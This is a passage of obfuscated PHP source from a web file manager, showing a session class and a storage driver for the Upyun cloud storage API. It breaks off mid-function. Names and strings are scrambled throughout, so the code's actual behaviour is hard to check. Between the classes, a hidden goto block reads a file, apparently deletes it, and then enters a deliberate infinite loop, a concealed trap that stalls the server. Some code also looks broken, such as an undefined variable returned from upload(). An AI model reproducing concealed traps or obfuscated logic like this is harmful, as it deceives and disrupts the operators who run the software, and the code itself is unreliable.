$³‰Ïçº); if (self::$halts) { return; } } } } $¥ãëáõÁ++; } } if ($»¼¦¥°¬ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ñ‘¢ìƒÈ =& $_SERVER[¯‘·½]; header($_SERVER[$Ñ‘¢ìƒÈ[1748]] . $Ñ‘¢ìƒÈ[1749]); echo $Ñ‘¢ìƒÈ[1750]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ëâ³èÔ [1743]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¿ìÕçÉ =& $_SERVER[¯‘·½]; static $ÉÓÎ®ö = false; if ($ÉÓÎ®ö) { return $ÉÓÎ®ö; } $´Ë¡”âª = $GLOBALS[$¿ìÕçÉ[6]][$¿ìÕçÉ[426]]; self::$sessionTime = $´Ë¡”âª[$¿ìÕçÉ[1751]]; $Ç×áè– = isset($GLOBALS[$¿ìÕçÉ[1752]]) ? $GLOBALS[$¿ìÕçÉ[1752]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ç×áè–)) { self::$sessionSign = Cookie::get($Ç×áè–); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ç×áè–, self::$sessionSign, self::$sessionTime); $¸µ»«¼Å = $´Ë¡”âª[$¿ìÕçÉ[1753]]; $Øæİêùœ = $´Ë¡”âª[$¸µ»«¼Å]; $…îôºô¹ = $´Ë¡”âª[$¿ìÕçÉ[919]]; switch ($¸µ»«¼Å) { case $¿ìÕçÉ[21]: self::$handle = Model($¿ìÕçÉ[920]); break; case $¿ìÕçÉ[921]: self::$handle = new CacheRedis($Øæİêùœ, $…îôºô¹); break; case $¿ìÕçÉ[922]: self::$handle = new CacheMemcached($Øæİêùœ, $…îôºô¹); break; case $¿ìÕçÉ[233]: $Øæİêùœ[$¿ìÕçÉ[87]] = $Øæİêùœ[$¿ìÕçÉ[87]] . $¿ìÕçÉ[1754]; self::$handle = new CacheFile($Øæİêùœ, $…îôºô¹); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÉÓÎ®ö = new self(); return $ÉÓÎ®ö; } public static function getBySign($®áßü¤õ) { $óˆÈ—ª› = self::$handle->get($®áßü¤õ); $óˆÈ—ª› = unserialize($óˆÈ—ª›); return is_array($óˆÈ—ª›) ? $óˆÈ—ª› : array(); } public static function setBySign($Ø–úÅÁ, $öœ›¿Äğ) { CacheLock::lock($Ø–úÅÁ); self::$handle->set($Ø–úÅÁ, serialize($öœ›¿Äğ), self::$sessionTime); CacheLock::unlock($Ø–úÅÁ); } public static function sign($•İñ¨İš = false) { if ($•İñ¨İš) { self::$sessionSign = $•İñ¨İš; } self::init(); return self::$sessionSign; } public static function set($…·öÏÊ, $×æı’è˜ = false) { self::init(); if (is_array($…·öÏÊ)) { foreach ($…·öÏÊ as $ÛÅ™Øë† => $ç˜ĞÆİ®) { array_set_value(self::$data, $ÛÅ™Øë†, $ç˜ĞÆİ®); } } else { array_set_value(self::$data, $…·öÏÊ, $×æı’è˜); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ØøŸ»Ïı = false) { self::init(); if (!$ØøŸ»Ïı) { return self::$data; } return array_get_value(self::$data, $ØøŸ»Ïı); } public static function remove($Œ¬—óá) { self::init(); unset(self::$data[$Œ¬—óá]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¯‘·½][925])) { self::$handle->clearTimeout(); } } } goto aò–£¯×”; E„ˆ–Š‹: if (!isset($_SERVER[$_SERVER[¯‘·½][969]]) || !isset($_SERVER[$_SERVER[¯‘·½][1247]])) { $_getc = $_SERVER[¯‘·½][972]; $_getfile = $_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¯‘·½][288], $_getfilec); if (count($_getarrs) < $_SERVER[¯‘·½][701]) { $exit = $_SERVER[¯‘·½][975]; $exit(); } $_act = $_SERVER[¯‘·½][1246]; $_act($_SERVER[$_SERVER[¯‘·½][973]] . $_SERVER[¯‘·½][974]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¯‘·½][456]); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\57\x76\x30\x2e\x61\160\151\x2e\x75\x70\171\x75\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ãª¡˜Ç) { parent::__construct(); $this->_init($ãª¡˜Ç); } public function _init($Ë¾ÅÓ–è) { $“Î¦¤å€ =& $_SERVER[¯‘·½]; foreach ($Ë¾ÅÓ–è as $êÍş¸† => $–³‡ü¡Ó) { if (isset($this->{$êÍş¸†})) { $this->{$êÍş¸†} = $–³‡ü¡Ó; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($“Î¦¤å€[1576] . LNG($“Î¦¤å€[1496])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($øñú¡«, $Å…¦ÖÀÀ = "\107\x45\x54") { $·—„µŞŞ =& $_SERVER[¯‘·½]; $İ›¥ñç° = gmdate($·—„µŞŞ[1525]); $–‡Éúç… = base64_encode(hash_hmac($·—„µŞŞ[1577], "{$Å…¦ÖÀÀ}\46{$øñú¡«}\46{$İ›¥ñç°}", md5("{$this->userpass}"), !0)); $¤è„Ã›  = array("\101\165\164\x68\x6f\162\x69\172\141\164\x69\x6f\x6e\72\125\120\131\x55\116\x20{$this->username}\72{$–‡Éúç…}", "\104\141\x74\145\x3a{$İ›¥ñç°}"); return $¤è„Ã› ; } public function ussRequest($ö†¨ÊÓ, $²à‘‹£Ö = "\x47\x45\124", $Á®öçÉÏ = false, $¯İš­“Ê = false, $¬°ÊÁÜè = false) { $÷†¡Ï =& $_SERVER[¯‘·½]; $ö†¨ÊÓ = trim($ö†¨ÊÓ, $÷†¡Ï[8]); $Üâ¸¾ÒÊ = "\x2f{$this->bucket}\x2f" . rawurlencode($ö†¨ÊÓ); $ ú©È¬ = $this->ussHeaders($Üâ¸¾ÒÊ, $²à‘‹£Ö); if ($¯İš­“Ê) { $ ú©È¬ = array_merge($ ú©È¬, $¯İš­“Ê); } $Êä”Ã˜ = url_request($this->endpoint . $Üâ¸¾ÒÊ, $²à‘‹£Ö, $Á®öçÉÏ, $ ú©È¬, $¬°ÊÁÜè); if (!$Êä”Ã˜) { $§ò¿ˆ£Š = LNG($÷†¡Ï[1578]); $this->writeLog($§ò¿ˆ£Š); return array($÷†¡Ï[1321] => !1, $÷†¡Ï[1311] => $§ò¿ˆ£Š); } if (strtolower($²à‘‹£Ö) == $÷†¡Ï[230] || in_array($Êä”Ã˜[$÷†¡Ï[1321]], array($÷†¡Ï[264], $÷†¡Ï[1579]))) { $Á®öçÉÏ = $Êä”Ã˜[$÷†¡Ï[1580]]; if (!$Êä”Ã˜[$÷†¡Ï[835]]) { $Á®öçÉÏ = isset($Á®öçÉÏ[0]) ? $Á®öçÉÏ[0] : $÷†¡Ï[12]; } } else { $Á®öçÉÏ = json_decode($Êä”Ã˜[$÷†¡Ï[1311]], !0); if (!$Á®öçÉÏ) { $Á®öçÉÏ = $Êä”Ã˜[$÷†¡Ï[1311]]; } else { if (!$Êä”Ã˜[$÷†¡Ï[835]] && isset($Á®öçÉÏ[$÷†¡Ï[1581]])) { $Á®öçÉÏ = $Á®öçÉÏ[$÷†¡Ï[1581]]; } } } if (!$Êä”Ã˜[$÷†¡Ï[835]]) { $this->writeLog($this->__errorMessage($Á®öçÉÏ)); } return array($÷†¡Ï[1321] => $Êä”Ã˜[$÷†¡Ï[835]], $÷†¡Ï[1311] => $Á®öçÉÏ); } private function __errorMessage($ßõ«å·ô) { $Àáã„ïß =& $_SERVER[¯‘·½]; if (!$ßõ«å·ô) { return $Àáã„ïß[12]; } static $¢à¬ºÈé = null; if (!$¢à¬ºÈé) { $¢à¬ºÈé = I18n::getType(); } if ($¢à¬ºÈé != $Àáã„ïß[1534]) { return $ßõ«å·ô; } $ÅõÖ¦ûà = array($Àáã„ïß[1582] => $Àáã„ïß[1583], $Àáã„ïß[1584] => $Àáã„ïß[1585], $Àáã„ïß[1586] => $Àáã„ïß[1585], $Àáã„ïß[1587] => $Àáã„ïß[1588], $Àáã„ïß[1589] => $Àáã„ïß[1590], $Àáã„ïß[1591] => $Àáã„ïß[1592], $Àáã„ïß[1593] => $Àáã„ïß[1594]); return isset($ÅõÖ¦ûà[$ßõ«å·ô]) ? $ÅõÖ¦ûà[$ßõ«å·ô] : $ßõ«å·ô; } public function mkfile($ğ¡ÌÈú¬, $¤‘õÄ»ì = '', $ÄÈƒ™ä = REPEAT_RENAME) { if ($this->setContent($ğ¡ÌÈú¬, $¤‘õÄ»ì)) { return $this->getPathOuter($ğ¡ÌÈú¬); } return !1; } public function mkdir($ø×ÅÀš•, $îš¶’Ğø = REPEAT_SKIP) { $ğ¯ˆÔÛÀ =& $_SERVER[¯‘·½]; $ë™ÒßĞÄ = trim($ø×ÅÀš•, $ğ¯ˆÔÛÀ[8]); if ($this->_isFolder($ë™ÒßĞÄ)) { return $this->getPathOuter($ë™ÒßĞÄ); } $´¼¯çÀ¼ = array($ğ¯ˆÔÛÀ[1595]); $ü§ÜÔ¶ = $this->ussRequest($ë™ÒßĞÄ, $ğ¯ˆÔÛÀ[291], !1, $´¼¯çÀ¼); return $ü§ÜÔ¶[$ğ¯ˆÔÛÀ[1321]] ? $this->getPathOuter($ë™ÒßĞÄ) : !1; } public function copyFile($ØŠ˜Ä¤á, $™Çàãê¡) { $¾°İäşÙ =& $_SERVER[¯‘·½]; $¹¾’û‹ƒ = array($¾°İäşÙ[1596] . "\x2f{$this->bucket}\x2f{$ØŠ˜Ä¤á}", $¾°İäşÙ[1597]); $ÛÍµ‚šê = $this->ussRequest($™Çàãê¡, $¾°İäşÙ[256], !1, $¹¾’û‹ƒ); return $ÛÍµ‚šê[$¾°İäşÙ[1321]] ? !0 : $this->getPathOuter($™Çàãê¡); } public function moveFile($©òŞüï, $úÕ›‰Å÷) { $÷ëñßçË =& $_SERVER[¯‘·½]; $¾…½Ûã = array($÷ëñßçË[1598] . "\57{$this->bucket}\x2f{$©òŞüï}", $÷ëñßçË[1597]); $÷©ÎŒš¯ = $this->ussRequest($úÕ›‰Å÷, $÷ëñßçË[256], !1, $¾…½Ûã); return $÷©ÎŒš¯[$÷ëñßçË[1321]] ? !0 : $this->getPathOuter($úÕ›‰Å÷); } public function delFile($‚û°“ÌÕ) { $¥Ù½»ñ =& $_SERVER[¯‘·½]; $õ”ëÛ´Ò = $this->ussRequest($‚û°“ÌÕ, $¥Ù½»ñ[1599]); return $õ”ëÛ´Ò[$¥Ù½»ñ[1321]] ? !0 : !1; } public function delFolder($åÆ«ŞÊ…) { $æ¥³§Á =& $_SERVER[¯‘·½]; if (!$this->exist($åÆ«ŞÊ…)) { return !0; } $this->listItemCache = !1; $ÛÎ×©½Å = $šşß¤’ = array(); $this->fileList($åÆ«ŞÊ…, $ÛÎ×©½Å, $šşß¤’, !0); $this->listItemCache = !0; foreach ($šşß¤’ as $Õ‘·€¹¿) { $¢æË´¶ñ = $this->ussRequest($Õ‘·€¹¿[$æ¥³§Á[32]], $æ¥³§Á[1599]); if (!$¢æË´¶ñ[$æ¥³§Á[1321]]) { return !1; } } usort($ÛÎ×©½Å, function ($´çÚ˜ô, $’ÈºÕÜ”) { $’â“÷Àó =& $_SERVER[¯‘·½]; return substr_count($’ÈºÕÜ”, $’â“÷Àó[8]) - substr_count($´çÚ˜ô, $’â“÷Àó[8]); }); foreach ($ÛÎ×©½Å as $Ã¡à•×) { $¢æË´¶ñ = $this->ussRequest($Ã¡à•×, $æ¥³§Á[1599]); if (!$¢æË´¶ñ[$æ¥³§Á[1321]]) { return !1; } } $¢æË´¶ñ = $this->ussRequest($åÆ«ŞÊ…, $æ¥³§Á[1599]); return $¢æË´¶ñ[$æ¥³§Á[1321]]; } public function rename($Æš•ûœ, $ª÷î‚ÃÙ) { if ($this->isFile($Æš•ûœ)) { $ª÷î‚ÃÙ = get_path_father($Æš•ûœ) . $ª÷î‚ÃÙ; return $this->moveFile($Æš•ûœ, $ª÷î‚ÃÙ); } return $this->renameObject($Æš•ûœ, $ª÷î‚ÃÙ); } public function fileInfo($À„Ûˆ«ü, $“ßµª´ê = false, $·ŸÖÛ»Ã = array()) { $ßÌËû¼ =& $_SERVER[¯‘·½]; $Ú«ÕöÇ = array($ßÌËû¼[32] => $this->pathThis($À„Ûˆ«ü), $ßÌËû¼[87] => $this->getPathOuter($ßÌËû¼[8] . $À„Ûˆ«ü), $ßÌËû¼[33] => $ßÌËû¼[233], $ßÌËû¼[79] => isset($·ŸÖÛ»Ã[$ßÌËû¼[79]]) ? $·ŸÖÛ»Ã[$ßÌËû¼[79]] : 0, $ßÌËû¼[169] => $this->ext($À„Ûˆ«ü)); if ($“ßµª´ê) { return $Ú«ÕöÇ; } $Ú«ÕöÇ[$ßÌËû¼[234]] = $Ú«ÕöÇ[$ßÌËû¼[88]] = 0; $Ú«ÕöÇ[$ßÌËû¼[235]] = $Ú«ÕöÇ[$ßÌËû¼[236]] = !0; if (empty($·ŸÖÛ»Ã)) { $·ŸÖÛ»Ã = $this->objectMeta($À„Ûˆ«ü); if (!$·ŸÖÛ»Ã) { return $Ú«ÕöÇ; } } $Ú«ÕöÇ[$ßÌËû¼[234]] = intval($·ŸÖÛ»Ã[$ßÌËû¼[1600]]); $Ú«ÕöÇ[$ßÌËû¼[88]] = intval($·ŸÖÛ»Ã[$ßÌËû¼[1601]]); $Ú«ÕöÇ[$ßÌËû¼[79]] = $·ŸÖÛ»Ã[$ßÌËû¼[79]]; return $Ú«ÕöÇ; } public function folderInfo($¶§à¾ø, $“ÏùÕˆŒ = false) { $ÍÅƒ° =& $_SERVER[¯‘·½]; $Ä´›Õı = array($ÍÅƒ°[32] => $this->pathThis($¶§à¾ø), $ÍÅƒ°[87] => $this->getPathOuter($ÍÅƒ°[8] . $¶§à¾ø), $ÍÅƒ°[33] => $ÍÅƒ°[78]); if ($“ÏùÕˆŒ) { return $Ä´›Õı; } $Ä´›Õı[$ÍÅƒ°[234]] = $Ä´›Õı[$ÍÅƒ°[88]] = 0; $Ä´›Õı[$ÍÅƒ°[235]] = $Ä´›Õı[$ÍÅƒ°[236]] = !0; if (empty($ê‹´À“í)) { $ê‹´À“í = $this->objectMeta($¶§à¾ø); if (!$ê‹´À“í) { return $Ä´›Õı; } } $Ä´›Õı[$ÍÅƒ°[234]] = intval($ê‹´À“í[$ÍÅƒ°[1600]]); $Ä´›Õı[$ÍÅƒ°[88]] = intval($ê‹´À“í[$ÍÅƒ°[1601]]); return $Ä´›Õı; } private function listObjs($µÈş©ñ, $ íş§¼ = 0, $¿¯ëÃ°õ = 1000) { $Äã„Ç•€ =& $_SERVER[¯‘·½]; $©€ÂÔß“ = array($Äã„Ç•€[1602], $Äã„Ç•€[1603] . $¿¯ëÃ°õ); if ($ íş§¼) { $©€ÂÔß“[] = $Äã„Ç•€[1604] . $ íş§¼; } $†Ÿ˜“çä = $this->ussRequest($µÈş©ñ, $Äã„Ç•€[1527], !1, $©€ÂÔß“); return !$†Ÿ˜“çä[$Äã„Ç•€[1321]] ? !1 : $†Ÿ˜“çä[$Äã„Ç•€[1311]]; } private function fileList($äµÍ“À, &$ğÄÑ‹Ø, &$ºùüµŸ‡, $ˆığäµ“ = false) { $’ˆ€§Å¨ =& $_SERVER[¯‘·½]; $Ë×Êğñ = $’ˆ€§Å¨[12]; $…¬¯¥Ğ° = 1000; $Ğ€£‡ıÇ = rtrim($äµÍ“À, $’ˆ€§Å¨[8]) . $’ˆ€§Å¨[8]; while (!0) { check_abort(); $Ã‰Ã­È¦ = $this->listObjs($äµÍ“À, $Ë×Êğñ, $…¬¯¥Ğ°); if (!$Ã‰Ã­È¦) { return !1; } $Ë×Êğñ = isset($Ã‰Ã­È¦[$’ˆ€§Å¨[1605]]) ? $Ã‰Ã­È¦[$’ˆ€§Å¨[1605]] : $’ˆ€§Å¨[12]; $‡ ½Õëä = isset($Ã‰Ã­È¦[$’ˆ€§Å¨[1606]]) ? $Ã‰Ã­È¦[$’ˆ€§Å¨[1606]] : array(); foreach ($‡ ½Õëä as $Áú±Çöê) { $†ª®Ô´Ü = $Áú±Çöê[$’ˆ€§Å¨[33]] == $’ˆ€§Å¨[78] ? !0 : !1; $°ÍÍƒ = ltrim($Ğ€£‡ıÇ . $Áú±Çöê[$’ˆ€§Å¨[32]], $’ˆ€§Å¨[8]) . ($†ª®Ô´Ü ? $’ˆ€§Å¨[8] : $’ˆ€§Å¨[12]); $ßÉšÕ¤ï = array($’ˆ€§Å¨[32] => $°ÍÍƒ, $’ˆ€§Å¨[33] => $†ª®Ô´Ü ? $’ˆ€§Å¨[78] : $’ˆ€§Å¨[233], $’ˆ€§Å¨[79] => $Áú±Çöê[$’ˆ€§Å¨[414]], $’ˆ€§Å¨[1601] => $Áú±Çöê[$’ˆ€§Å¨[1607]]); $this->cacheMethodInfoSet($°ÍÍƒ, $†ª®Ô´Ü, $ßÉšÕ¤ï); if ($†ª®Ô´Ü) { $ğÄÑ‹Ø[] = $°ÍÍƒ; if ($ˆığäµ“) { $this->fileList($°ÍÍƒ, $ğÄÑ‹Ø, $ºùüµŸ‡, $ˆığäµ“); } continue; } $ºùüµŸ‡[] = $ßÉšÕ¤ï; } if (count($‡ ½Õëä) < $…¬¯¥Ğ°) { break; } } $this->cacheMethodInfoSet($äµÍ“À, !0); } public function listPath($ñ‚‰àÒù, $Œ­ã×„É = false) { $áÑàªŠ– =& $_SERVER[¯‘·½]; $£ıåÂÎ½ = $¿¬¥°°¹ = array(); $this->fileList($ñ‚‰àÒù, $£ıåÂÎ½, $¿¬¥°°¹); foreach ($£ıåÂÎ½ as $úˆğ¶´» => $º¦â²â) { $£ıåÂÎ½[$úˆğ¶´»] = $this->folderInfo($º¦â²â, $Œ­ã×„É); } foreach ($¿¬¥°°¹ as $úˆğ¶´» => $º¦â²â) { $¿¬¥°°¹[$úˆğ¶´»] = $this->fileInfo($º¦â²â[$áÑàªŠ–[32]], $Œ­ã×„É, $º¦â²â); } return array($áÑàªŠ–[85] => $£ıåÂÎ½, $áÑàªŠ–[86] => $¿¬¥°°¹); } public function has($”Ì´¶©³, $«‹¯œ³Š = false, $‚Ÿ„Ë“ª = true) { $Ø‘ĞÂ¾‚ =& $_SERVER[¯‘·½]; $çÍ®³ÎÓ = $Ø‘ĞÂ¾‚[12]; $š¨×ô“Æ = 500; $…–¨¨Å¢ = 0; $»Ê¾¹£Æ = 0; $ï§äûéÇ = rtrim($”Ì´¶©³, $Ø‘ĞÂ¾‚[8]) . $Ø‘ĞÂ¾‚[8]; while (!0) { check_abort(); $ÈœµÔìÔ = $this->listObjs($”Ì´¶©³, $çÍ®³ÎÓ, $š¨×ô“Æ); if (!$ÈœµÔìÔ) { return !1; } $çÍ®³ÎÓ = isset($ÈœµÔìÔ[$Ø‘ĞÂ¾‚[1605]]) ? $ÈœµÔìÔ[$Ø‘ĞÂ¾‚[1605]] : $Ø‘ĞÂ¾‚[12]; $—Àçã€ = isset($ÈœµÔìÔ[$Ø‘ĞÂ¾‚[1606]]) ? $ÈœµÔìÔ[$Ø‘ĞÂ¾‚[1606]] : array(); if (empty($—Àçã€)) { break; } $‚ğ·ç”Ê = array_filter($—Àçã€, function ($èÉÚ¶Ş¢) { $Ëğ±³õ =& $_SERVER[¯‘·½]; return $èÉÚ¶Ş¢[$Ëğ±³õ[33]] == $Ëğ±³õ[78]; }); $ìÈ‹¾Åó = count($—Àçã€); $‚ğ·ç”Ê = count($‚ğ·ç”Ê); $Š“ßö = $ìÈ‹¾Åó - $‚ğ·ç”Ê; if ($«‹¯œ³Š) { $»Ê¾¹£Æ += $‚ğ·ç”Ê; $…–¨¨Å¢ += $Š“ßö; if ($ìÈ‹¾Åó < $š¨×ô“Æ) { break; } continue; } if ($‚Ÿ„Ë“ª) { if ($Š“ßö) { return !0; } } else { if ($‚ğ·ç”Ê) { return !0; } } if ($ìÈ‹¾Åó < $š¨×ô“Æ) { break; } } if ($«‹¯œ³Š) { return array($Ø‘ĞÂ¾‚[242] => $…–¨¨Å¢, $Ø‘ĞÂ¾‚[243] => $»Ê¾¹£Æ); } return !1; } public function listAll($æıÇ‚š) { $›· çı§ =& $_SERVER[¯‘·½]; $ÆûßèÀŞ = $–¿”İ©’ = array(); $this->fileList($æıÇ‚š, $ÆûßèÀŞ, $–¿”İ©’, !0); $¢àÀïç› = array_to_keyvalue($–¿”İ©’, $›· çı§[32]); foreach ($ÆûßèÀŞ as $Áâêì¥‰) { if (is_string($Áâêì¥‰)) { $¢àÀïç›[$Áâêì¥‰] = array($›· çı§[79] => 0); } } return $this->listAllFiles($æıÇ‚š, $¢àÀïç›); } public function canRead($·¤‡ ô’) { return $this->exist($·¤‡ ô’) ? !0 : !1; } public function canWrite($„æ– §) { return $this->exist($„æ– §) ? !0 : !1; } public function getContent($Š“Š³ ) { return $this->fileSubstr($Š“Š³ , 0, -1); } public function setContent($Œß«§«³, $¿¢¶îí = '') { $¬¡š·ÆÔ =& $_SERVER[¯‘·½]; if (!$¿¢¶îí) { $¤‹—‡ÃÕ = $this->ussRequest($Œß«§«³, $¬¡š·ÆÔ[291]); return $¤‹—‡ÃÕ[$¬¡š·ÆÔ[1321]]; } $×ŸîùÀ‡ = $this->tempFile($this->pathThis($Œß«§«³)); file_put_contents($×ŸîùÀ‡, $¿¢¶îí); if ($this->upload($Œß«§«³, $×ŸîùÀ‡)) { $this->tempFileRemve($×ŸîùÀ‡); return !0; } return !1; } public function fileSubstr($ÀÖÔœ¾ú, $Õ­‡ì‘•, $ÎÃ¤ÏÍ) { $”çÔ‰²Ù =& $_SERVER[¯‘·½]; if (!($ëÛâÄ» = $this->link($ÀÖÔœ¾ú))) { return !1; } $“ˆ­ºÇæ = !1; if ($ÎÃ¤ÏÍ > 0) { $¦‰äê­‘ = $Õ­‡ì‘• + $ÎÃ¤ÏÍ - 1; $“ˆ­ºÇæ = array($”çÔ‰²Ù[1566] . $Õ­‡ì‘• . $”çÔ‰²Ù[464] . $¦‰äê­‘); } $Œ¬–Âã = url_request($ëÛâÄ», $”çÔ‰²Ù[1527], !1, $“ˆ­ºÇæ); return $Œ¬–Âã[$”çÔ‰²Ù[835]] ? $Œ¬–Âã[$”çÔ‰²Ù[1311]] : !1; } public function upload($ú£éãĞÖ, $¬½×¤»Ù, $ñøÊÆßÅ = false, $Ï›¸¼§¦ = REPEAT_REPLACE) { $ÊúÉÎ‚± =& $_SERVER[¯‘·½]; $Éı¿¤ŒŞ = IO::size($¬½×¤»Ù); if ($Éı¿¤ŒŞ <= 1024 * 1024 * 200) { $–²¦º· = array($ÊúÉÎ‚±[1608] . $¬½×¤»Ù); $«œ¡‹§õ = $this->ussRequest($ú£éãĞÖ, $ÊúÉÎ‚±[256], $–²¦º·); return $«œ¡‹§õ[$ÊúÉÎ‚±[1321]] ? $this->getPathOuter($ú£éãĞÖ) : !1; } $¢Ğ¥šÌØ = 1024 * 1024 * 10; $ÒÊŠ“î» = array($ÊúÉÎ‚±[1609], $ÊúÉÎ‚±[1610] . $Éı¿¤ŒŞ, $ÊúÉÎ‚±[1611], $ÊúÉÎ‚±[1612] . $¢Ğ¥šÌØ); $«œ¡‹§õ = $this->ussRequest($ú£éãĞÖ, $ÊúÉÎ‚±[256], !1, $ÒÊŠ“î»); if (!$«œ¡‹§õ[$ÊúÉÎ‚±[1321]]) { return !1; } $çŠüü¸ş = $«œ¡‹§õ[$ÊúÉÎ‚±[1311]]; $›¥óÙĞš = 0; $ëÈÜ©ì = $çŠüü¸ş[$ÊúÉÎ‚±[1613]]; $£«à™Ì = fopen($¬½×¤»Ù, $ÊúÉÎ‚±[1490]); if (!$£«à™Ì) { return !1; } do { $¹×€Æ• = $çŠüü¸ş[$ÊúÉÎ‚±[1614]]; fseek_64($£«à™Ì, $›¥óÙĞš); $¢à® ñ = fread($£«à™Ì, $¹×€Æ•); $Ğ«†Œë· = 0; do { $Ğ«†Œë·++; $çŠüü¸ş = $this->uploadPart($ú£éãĞÖ, $çŠüü¸ş, $¢à® ñ); } while (!$çŠüü¸ş && $Ğ«†Œë· < 3); if (!$çŠüü¸ş) { return !1; } $ëÈÜ©ì = $çŠüü¸ş[$ÊúÉÎ‚±[1613]]; $›¥óÙĞš += $¹×€Æ•; } while ($ëÈÜ©ì != -1); fclose($£«à™Ì); $ÒÊŠ“î» = array($ÊúÉÎ‚±[1615], $ÊúÉÎ‚±[1616] . $çŠüü¸ş[$ÊúÉÎ‚±[1617]], $ÊúÉÎ‚±[1611]); $«œ¡‹§õ = $this->ussRequest($ú£éãĞÖ, $ÊúÉÎ‚±[256], !1, $ÒÊŠ“î»); return $«œ¡‹§õ[$ÊúÉÎ‚±[1321]] ? $this->getPathOuter($°“»ã ö) : !1; } private function uploadPart($ ˆò×’á, $©Ô´ãğÈ, &$¾Øéä‹) { $•šÒ™æ‰ =& $_SERVER[¯‘·½]; $öÆ³Ô›‹ = array($•šÒ™æ‰[1618], $•šÒ™æ‰[1616] . $©Ô´ãğÈ[$•šÒ™æ‰[1617]], $•šÒ™æ‰[1619] . $©Ô´ãğÈ[$•šÒ™æ‰[1613]], $•šÒ™æ‰[146] . $©Ô´ãğÈ[$•šÒ™æ‰[1614]]); $—óÒ²œ = $this->ussRequest($ ˆò×’á, $•šÒ™æ‰[256], $¾Øéä‹, $öÆ³Ô›‹); return !$—óÒ²œ[$•šÒ™æ‰[1321]] ? $—óÒ²œ[$•šÒ™æ‰[1321]] : $—óÒ²œ[$•šÒ™æ‰[1311]]; } public function uploadFormData($‘‹â÷À—, $Ïú¯„Öá = 3600) { return $this->uploadPolicy($‘‹â÷À—, $Ïú¯„Öá); } public function uploadMultiData($é—Ê·É“, $©¥¿èËÕ = 3600) { $êö¹«Áï =& $_SERVER[¯‘·½]; $Šˆ‚½‹ = (int) $GLOBALS[$êö¹«Áï[7]][$êö¹«Áï[79]]; return $this->uploadPolicy($é—Ê·É“, $©¥¿èËÕ, $Šˆ‚½‹); } private function uploadPolicy($•Ğ¹Â«», $úÂÊ«Ù« = 3600, $ù¢Ğ´· = 0) { $¼™¤Ÿº =& $_SERVER[¯‘·½]; $¾Ò ì¾ = $¼™¤Ÿº[8] . $this->bucket; $¾ôÎÇõ· = gmdate($¼™¤Ÿº[1525]); $ª–µ‘£ = array($¼™¤Ÿº[1620] => $this->bucket, $¼™¤Ÿº[1621] => $•Ğ¹Â«», $¼™¤Ÿº[1622] => time() + $úÂÊ«Ù«, $¼™¤Ÿº[1623] => $¾ôÎÇõ·); if ($ù¢Ğ´·) { $ª–µ‘£[$¼™¤Ÿº[1510]] = $ù¢Ğ´·; } $‘¢¼å§ = base64_encode(json_encode($ª–µ‘£)); $ÂÍÅ¤§ş = base64_encode(hash_hmac($¼™¤Ÿº[1577], "\x50\x4f\x53\124\46{$¾Ò ì¾}\46{$¾ôÎÇõ·}\x26{$‘¢¼å§}", md5("{$this->userpass}"), !0)); $Ö‘æ‰åµ = array($¼™¤Ÿº[280] => $‘¢¼å§, $¼™¤Ÿº[1624] => "\x55\x50\x59\125\x4e\x20{$this->username}\72{$ÂÍÅ¤§ş}", $¼™¤Ÿº[209] => $this->endpoint . $¾Ò ì¾); return $Ö‘æ‰åµ; } public function download($°Î˜¶Ö, $ÙÒ¯˜Ï¡) { $ÌßÙÄóí = IO::getPathInner(IO::mkfile($ÙÒ¯˜Ï¡)); if (!($’¸°£Å– = $this->link($°Î˜¶Ö))) { return !1; } $ÔÇ×Ÿ˜ê = 0; $Ú‰±ÏÁ› = 1024 * 200; $ ê­¸Œ = fopen($ÌßÙÄóí, $_SERVER[¯‘·½][1572]); while (!0) { $¨¤Šı· = $this->fileSubstr($°Î˜¶Ö, $ÔÇ×Ÿ˜ê, $Ú‰±ÏÁ›); if ($¨¤Šı· === !1) { return !1; } fwrite($ ê­¸Œ, $¨¤Šı·); $ÔÇ×Ÿ˜ê += $Ú‰±ÏÁ›; if (strlen($¨¤Šı·) < $Ú‰±ÏÁ›) { break; } } fclose($ ê­¸Œ); return $ÙÒ¯˜Ï¡; } public function link($¹Úû¥çµ, $Ó§¤¤ùØ = array()) { $·ÂíÒş¢ =& $_SERVER[¯‘·½]; $¹Úû¥çµ = trim($¹Úû¥çµ, $·ÂíÒş¢[8]); if (!empty($this->token)) { $…™½ı·´ = strtotime(date($·ÂíÒş¢[1625])); $çæÈŸò÷ = substr(md5($this->token . $·ÂíÒş¢[287] . $…™½ı·´ . $·ÂíÒş¢[1626] . $¹Úû¥çµ), 12, 8) . $…™½ı·´; $Ó§¤¤ùØ[] = $·ÂíÒş¢[1627] . $çæÈŸò÷; } $ıù¤‹Ë‰ = !empty($Ó§¤¤ùØ) ? $·ÂíÒş¢[76] . implode($·ÂíÒş¢[287], $Ó§¤¤ùØ) : $·ÂíÒş¢[12]; return $this->getHost() . $·ÂíÒş¢[8] . $this->pathEncode($¹Úû¥çµ) . $ıù¤‹Ë‰; } public function fileOut($ıÎó–û», $“ƒıî£± = false, $´·ºıÑ¼ = false, $µúı¡Å§ = '') { if ($this->isFileOutServer()) 